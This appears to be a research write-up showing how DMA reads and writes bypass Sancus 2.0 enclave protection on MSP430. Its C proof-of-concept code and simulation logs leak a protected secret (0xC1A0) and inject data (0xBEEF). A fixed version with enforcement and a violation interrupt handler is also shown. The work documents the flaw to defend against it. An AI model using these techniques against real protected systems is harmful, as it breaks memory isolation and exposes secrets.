# Exploitation of Naive DMA Support
A simple example of how security guarantees are invalidated when DMA support is naively implemented on Sancus 2.0. If no memory access control is enforced on the DMA bus, it can access to the whole system memory, including protected sections. An attacker can exploit this vulnerability to leak secret data or inject malicious code into the module. \\ \autoref{lst:hello_sm} shows a simple Sancus software module \textit{"Hello"}: the macros \texttt{SM\_ENTRY(name)}, \texttt{SM\_FUNC(name)} and \texttt{SM\_DATA(name)} are respectively used to annotate modules entry points, functions or data. In brief, they take as input the name of the intended module, and attach some attributes\footnote{The attribute mechanism allows a developer to attach extra information (metadata) to language entities with a generalized syntax, instead of introducing new syntactic constructs or keywords for each feature. This information is intended to be used by the compiler, improving the quality of diagnostics produced by an implementation or specifying platform-specific behaviour~\cite{c_attributes}.} to the entity they are associated with (data, function or entry point), so that the Sancus compiler can include those in the module protected sections. \texttt{DECLARE\_SM(name, vendor\_id)}, instead, is used to declare a Sancus module. 

```
/* ======== HELLO WORLD SM ======== */
DECLARE_SM(hello, 0x1234);
#define HELLO_SECRET_CST    0xC1A0

int       SM_DATA(hello) *hello_secret;
int const SM_DATA(hello)  hello_const = HELLO_SECRET_CST;

void SM_FUNC(hello) hello_init(void)
{
    /* Confidential loading guarantees secrecy of constant in text section. */  
    hello_secret = (int*)(hello.data_section_start+OFFSET);
    *hello_secret = hello_const;
    ASSERT(*hello_secret == HELLO_SECRET_CST);
}

void SM_ENTRY(hello) hello_greet(void)
{
    hello_init();
    pr_info2("Hi from SM with ID %d, called by %d\n", sancus_get_self_id(), sancus_get_caller_id());
    pr_info2("Internally accessing to my secret: %.4x at addr.: 0x%.4x \n",*hello_secret, hello_secret);	
}

void SM_ENTRY(hello) hello_disable(void)
{
    sancus_disable(exit_success);
}
```



## Leak Secret Data
In the example provided the value of a secret constant is stored in the data section, at a known offset, for the sake of simplicity: in this way the DMA attack is carried in one shot. Though in a real-case scenario it's unlikely for the attacker to know the exactly location of the secret data, it is reasonable to assume that some analysis are carried on over the module to be broken, thus the example it's still valid. Finally, it is to be noticed that the values of start and end addresses of SMs text and data sections can be read from unprotected code.\\

```
int main()
{
    uint16_t start_dma;
    uint16_t disclosed_secret;
	
    msp430_io_init();
    sancus_enable(&hello); //Enable memory protection
	
    hello_greet(); //Module's function, automatically accessed from the unprotected code through the entry point

	
	/* ============== USING DMA ================ */
    start_dma = (uint16_t)(hello.data_section_start+OFFSET);
    pr_info("DMA illegal access to the secret data from unprotected code \n"); 

    //void dma_read (start_addr, num_of_words, *save_data)    
    dma_read(start_dma, 1, &disclosed_secret);
    pr_info2("Hello secret is: 0x%.4x at address: 0x%.4x \n", disclosed_secret, start_dma);
	/* ========================================= */
}
```

```
New SM config: 7130 7304 029c 03a6, 1
Vendor key: 4078d505d82099ba
...................................................................
SM key: b0c4cc0fb9ce3806
SM hello with ID 1 enabled	: 0x7130 0x7304 0x029c 0x03a6
[main.c] Hi from SM with ID 1, called by 0
[main.c] Internally accessing to my secret: 0xC1A0 at address: 0x02a3 
[main.c] DMA illegal access to "Hello" secret from unprotected code 

[main.c] Hello secret is: 0xC1A0 at address: 0x02a3 
SM disabled
[main.c] SM disabled; all done!
 ===============================================
|               SIMULATION PASSED               |
 ===============================================
```

After entering the main function, the memory protection for the "Hello" module is enabled. Then, the **hello_greet() is called, which initialises the secret data and sends a greeting to the reader. \\ The execution continues by configuring a DMA read operation from the main.c. The DMA read function inputs are: (1) the starting address, which is set with the start of data section shifted of the know offset, so that it directly points to the desired secret data; (2) the number of words to be read, set equal to one in this case; (3) the address of an unprotected memory location to where store the read data. Once the DMA operation has completed, the secret value \textsl{0xC1A0} is leaked and stored and printed from code in the unprotected memory. The output produced by the main.c is shown in (\autoref{lst:prints_on_terminal}). \\
As a final remark, \autoref{lst:prints_on_terminal_PROTECTION} shows what happens when the same code from \autoref{lst:hello_sm} and \autoref{lst:main_attack} is run on Sancus with memory access control enforced over DMA accesses: a violation is internally raised and the content of the secret data is not leaked. An interrupt request can be set so that more specific countermeasure can be taken when a DMA violation is detected; an example of DMA ISR is provided in \autoref{lst:DMA_ISR}.\\

```
New SM config: 7130 7304 029c 03a6, 1
Vendor key: 4078d505d82099ba
...................................................................
SM key: b0c4cc0fb9ce3806
SM hello with ID 1 enabled	: 0x7130 0x7304 0x029c 0x03a6
[main.c] Hi from SM with ID 1, called by 0
[main.c] Internally accessing to my secret: 0xC1A0 at address: 0x02a3 
[main.c] DMA illegal access to "Hello" secret from unprotected code 

[main.c] Hello secret is: 0x0000 at address: 0x02a3 
SM disabled
[main.c] SM disabled; all done!
 ===============================================
|               SIMULATION PASSED               |
 ===============================================
```
```
__attribute__((interrupt(DMA_IRQ))) 
void dma_violation_isr(void)
{
    puts("\t--> DMA VIOLATION IRQ; exiting...\n");
    EXIT();
    
    pr_info("should never reach here..");
    while(1);
}
```

## Inject Malicious Data or Code
Another possible attack implies the injection of malicious code or data into SMs protected sections. The SM considered is still the \textit{"Hello"} module from the previous example (\autoref{lst:hello_sm}). The only difference is that the SM \texttt{hello\_init()} function is now explicitly called only once right after the protection mechanism has been enabled, and not every time the \texttt{hello\_greet()} is entered. To this extent, its attribute is modified from SM\_FUNC to SM\_ENTRY. This is necessary, in order to prevent that the injected malicious message is simply overwritten before being printed by the greeting function. \autoref{lst:main_attack_write} shows the main.c, as framework for the attack.

```
int main()
{
    uint16_t start_dma;
	uint16_t data_to_send;
	
    msp430_io_init();
    sancus_enable(&hello); //Enable memory protection
	
    hello_init();  //Now defined as: void SM_ENTRY(hello) hello_init(void)
    hello_greet(); //Module's function, automatically accessed from the unprotected code through the entry point
	/* ============== USING DMA ================ */
    start_dma = (uint16_t)(hello.data_section_start+OFFSET);
    data_to_send = 0xBEEF;
	puts("DMA injecting external data into SM data section \n"); 
	
	//void dma_write(start_addr, num_of_words, *data_to_send);
	dma_write(start_dma, 1, &data_to_send);
	/* ========================================= */
	
	hello_greet(); 
}
```
After the greeting message has printed, to show that initialization has correctly occurred, the real attack can starts, by configuring the DMA write function. It takes three inputs: (1) a starting address pointing to the initial memory location where the external data are going to be written; (2) the number of words involved in the operation; (3) the first memory location where data resides. As for the previous example, the writing address is still set to a known offset in the data section. Then, the malicious greeting message \texttt{0xBEEF} is injected and the execution of the main function proceeds by calling the SM \texttt{hello\_greet()} again, to show that a tempering occurred (\autoref{lst:prints_on_terminal_write}). \\

\smallskip

```
New SM config: 7124 72ea 029c 03a6, 1
Vendor key: 4078d505d82099ba
...................................................................
SM key: ed151c6be5efda74
SM hello with ID 1 enabled	: 0x7124 0x72ea 0x029c 0x03a6
[main.c] Hi from SM with ID 1, called by 0
[main.c] Internally accessing to my secret: 0xC1A0 at address: 0x02a3 
[main.c] DMA injecting external data into SM data section 

[main.c] Hi from SM with ID 1, called by 0
[Hello.c] Internally accessing to my secret: 0xBEEF at address: 0x02a3 
SM disabled
[main.c] SM disabled; all done!
 ===============================================
|               SIMULATION PASSED               |
 ===============================================
```
